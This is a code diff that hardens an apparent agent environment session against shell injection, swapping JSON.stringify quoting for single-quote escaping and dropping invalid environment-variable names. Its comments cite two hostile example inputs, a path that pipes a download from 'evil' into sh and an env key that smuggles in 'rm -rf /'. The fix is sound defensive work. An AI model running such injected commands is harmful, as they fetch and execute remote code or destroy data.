@@ -99,6 +99,20 @@ const KEEPALIVE_COUNT_MAX = 5;
 /** Exec polling timeout for the close event before settling with whatever we have. */
 const EXEC_DRAIN_GRACE_MS = 100;
 
+/**
+ * Bash-safe single-quote escape — same idiom as `shQuote` in ssh-shell.ts /
+ * ssh-run-async.ts / grep-files.ts. `JSON.stringify` is NOT a substitute:
+ * JSON-string syntax is double-quoted, and bash still expands `$(...)` /
+ * backticks / `$VAR` inside a double-quoted argument — only single quotes
+ * make every byte but `'` itself literal.
+ */
+function shQuote(s: string): string {
+  return `'${s.replace(/'/g, `'\\''`)}'`;
+}
+
+/** POSIX portable environment-variable name: `[A-Za-z_][A-Za-z0-9_]*`. */
+const SAFE_ENV_KEY = /^[A-Za-z_][A-Za-z0-9_]*$/;
+
 function isDefinitiveTimeoutOrIdleError(err: unknown): boolean {
   if (err instanceof EnvironmentTimeoutError) return true;
   if (!err || typeof err !== 'object') return false;
@@ -467,16 +481,27 @@ export class EnvironmentSession extends EventEmitter implements IEnvironmentSess
     }
 
     // Build the full command with cwd + env injection (mirrors ssh-shell.ts).
+    // Both cwd and env values are caller-supplied (ultimately LLM-controlled
+    // via run_command/ssh_shell/glob) — shQuote (NOT JSON.stringify, which is
+    // double-quoted and leaves `$(...)`/backticks live to bash) is required so
+    // a value like `/tmp/$(curl evil|sh)` can't execute. Env KEYS can't be
+    // shell-quoted (they sit on the left of `export NAME=...`, outside any
+    // quoting), so a key that isn't a valid POSIX identifier is dropped
+    // instead of interpolated — silently accepting it would let a key like
+    // `FOO; rm -rf /` break out of the export statement entirely.
     let fullCommand = command;
     const cwd = opts.cwd ?? this.env.workingDir;
     if (cwd) {
-      fullCommand = `cd ${JSON.stringify(cwd)} && ${fullCommand}`;
+      fullCommand = `cd ${shQuote(cwd)} && ${fullCommand}`;
     }
     if (opts.env && Object.keys(opts.env).length > 0) {
       const envExports = Object.entries(opts.env)
-        .map(([k, v]) => `export ${k}=${JSON.stringify(String(v))}`)
+        .filter(([k]) => SAFE_ENV_KEY.test(k))
+        .map(([k, v]) => `export ${k}=${shQuote(String(v))}`)
         .join(' && ');
-      fullCommand = `${envExports} && ${fullCommand}`;
+      if (envExports) {
+        fullCommand = `${envExports} && ${fullCommand}`;
+      }
     }
 
     const startTime = Date.now();
